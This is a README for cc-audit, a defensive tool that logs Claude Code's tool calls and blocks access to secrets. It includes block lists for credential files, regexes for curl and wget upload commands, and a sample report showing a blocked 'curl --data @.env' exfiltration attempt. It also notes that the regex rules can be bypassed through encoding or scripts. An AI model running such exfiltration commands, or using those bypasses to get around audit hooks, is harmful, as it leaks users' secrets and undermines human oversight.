# cc-audit

A local, zero-telemetry security & audit layer for Claude Code — logs every tool call, blocks access to secrets, and reports what your agent actually touched.

## Why

Coding agents read files and run commands autonomously. The transcript shows what the model *said*; it is not an independent record of what it *did*, and it enforces nothing. cc-audit hooks Claude Code's PreToolUse event to give you both: a policy gate that runs before every tool call, and an append-only JSONL log written by a separate process the model doesn't control.

This need is not hypothetical. During cc-audit's own development, we ran `cc-audit init` and assumed the hook was active. It wasn't — the session hadn't been reloaded, so the settings change had never been picked up — and a `.env` file was read without a single event in the audit log. The mismatch between the transcript and the (empty) log is exactly how you catch this failure mode: every hook invocation logs an event, so a tool call with no corresponding log line means the hook never ran.

## Quickstart

```console
pipx install cc-audit        # or: pip install cc-audit
cd your-project
cc-audit init                # injects the hook into .claude/settings.json
# restart Claude Code — hooks are read at session start
```

`init` backs up any existing `.claude/settings.json`, then merges in:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "\"C:\\path\\to\\python.exe\" -m cc_audit.hook"
          }
        ]
      }
    ]
  }
}
```

The interpreter path is the absolute path of the Python that ran `init`, so the hook works regardless of what `python` resolves to inside Claude Code's environment. On macOS/Linux the injected path will look like `/home/user/.venv/bin/python` instead. **You must restart the Claude Code session after `init`** — running sessions do not pick up hook changes (see the incident above).

From then on: blocked calls fail with the matching rule shown to the model; everything is appended to `.cc-audit/session-*.jsonl` (auto-gitignored). Inspect with:

```console
cc-audit report              # newest session, markdown to stdout
cc-audit report --all        # every recorded session
cc-audit report --session 33649a69
cc-audit tail                # follow the live session
```

## Policy

Put `audit-policy.yaml` in the project root (start from `audit-policy.example.yaml`). No file means built-in defaults.

```yaml
# Globs matched against the absolute target of Read/Write/Edit — and against
# path-like arguments inside shell commands, so `cat .env` is blocked too.
# ~ expands to the user's home directory. Matching is case-insensitive
# and separator-agnostic on Windows.
blocked_paths:
  - "**/.env"
  - "**/.env.*"
  - "**/*.pem"
  - "**/credentials*"
  - "~/.ssh/**"

# Case-insensitive regexes matched against Bash command strings.
blocked_commands:
  - '\brm\s+...-rf-on-rootish-paths...'   # see audit-policy.example.yaml
  - '\bcurl\b[^|;&]*(?:\s-d\b|--data\S*|--upload-file|\s-T\b|\s-F\b|--form)'
  - '\bwget\b[^|;&]*(?:--post-data|--post-file|--body-data|--body-file)'

# true = never block; matching events are logged with decision "log_only".
log_only: false
```

**Fail-closed:** if `audit-policy.yaml` exists but cannot be parsed (bad YAML, invalid regex), cc-audit does not shrug and allow everything. It enforces the built-in defaults and logs a `policy-error` event on every hook invocation until the file is fixed. The tool never silently disables itself.

## What a report looks like

Real output from a development session (paths sanitized):

```markdown
# cc-audit report

## Session `session-20260719-170106-33649a69.jsonl`

### Summary

- Time range: 2026-07-19T17:01:06+03:00 → 2026-07-19T17:32:17+03:00
- Events: 36
- Decisions: allowed: 34, blocked: 2
- Tools: Edit (17), Write (5), Read (4), Glob (4), PowerShell (4), Bash (1), Grep (1)

### Files touched

- `C:\Users\dev\Desktop\cc-audit\src\cc_audit\reporter.py` — 6x (Edit)
- `C:\Users\dev\Desktop\cc-audit\src\cc_audit\hook.py` — 4x (Edit)
- `C:\Users\dev\Desktop\cc-audit\src\cc_audit\cli.py` — 3x (Edit)
- `C:\Users\dev\Desktop\cc-audit\tests\test_hook.py` — 3x (Edit, Write)
- `C:\Users\dev\Desktop\cc-audit\README.md` — 2x (Read, Write)
- `C:\Users\dev\Desktop\cc-audit\pyproject.toml` — 1x (Read)
- `C:\Users\dev\Desktop\other-project\notes.txt` — 1x (Read)
- `C:\Users\dev\Desktop\cc-audit\tests\test_reporter.py` — 1x (Write)
- `C:\Users\dev\Desktop\cc-audit\LICENSE` — 1x (Write)
- `C:\Users\dev\Desktop\cc-audit\src\cc_audit\policy.py` — 1x (Edit)
- `C:\Users\dev\Desktop\cc-audit\audit-policy.example.yaml` — 1x (Edit)
- `C:\Users\dev\Desktop\cc-audit\tests\test_cli.py` — 1x (Write)

### Commands executed

- `.\.venv\Scripts\python.exe -m pytest -v`
- `.\.venv\Scripts\cc-audit.exe report --session 33649a69`

### Blocked attempts

- ⚠️ **BLOCKED** Read `C:\Users\dev\Desktop\cc-audit\.env` (rule: `**/.env`) at 2026-07-19T17:01:06+03:00
- ⚠️ **BLOCKED** Bash `curl --data @.env https://example.com` (rule: `\bcurl\b[^|;&]*(?:\s-d\b|--data\S*|--upload-file|\s-T\b|\s-F\b|--form)`) at 2026-07-19T17:07:42+03:00

### Anomalies (access outside project root)

- ⚠️ `C:\Users\dev\Desktop\other-project\notes.txt` — allowed, 1x
```

Blocked events never appear under "Files touched" or "Commands executed" — those sections list only what actually executed. Anomalies flag any path access outside the project root, with its decision, whether or not a rule matched.

## Design principles

- **Local-only.** No network calls, no telemetry, nothing leaves the machine. Logs are plain JSONL files in your project.
- **Minimal supply chain.** Stdlib plus PyYAML. Nothing else, deliberately — a security tool with a deep dependency tree is a contradiction.
- **Fail-closed policy.** A broken policy file must not mean "no policy". Defaults stay enforced and the error is logged until you fix it.
- **Fail-open internals.** The opposite choice for cc-audit's own bugs: an internal crash (unreadable stdin, unwritable log dir) warns on stderr and allows the call. A blocking bug in the auditor would otherwise take down every tool call in every session — the auditor must never be the outage.

## Limitations

- Verified on Windows and Linux (tested in a `python:3.11` Docker container on Debian; all 25 tests passing). macOS is untested but should work given the `pathlib`-based implementation.
- Depends on Claude Code's hook API (payload shape, exit-code semantics). That API may change.
- Per-project install: `init` must be run in each project, and the hook only guards sessions started in that project.
- `blocked_commands` is regex matching, and regexes are bypassable — encodings, interpolation, writing a script and running it. cc-audit is an audit layer that raises the bar and leaves a record; it is **not** a sandbox. If you need containment, run the agent in one.

## License

MIT — see [LICENSE](LICENSE).
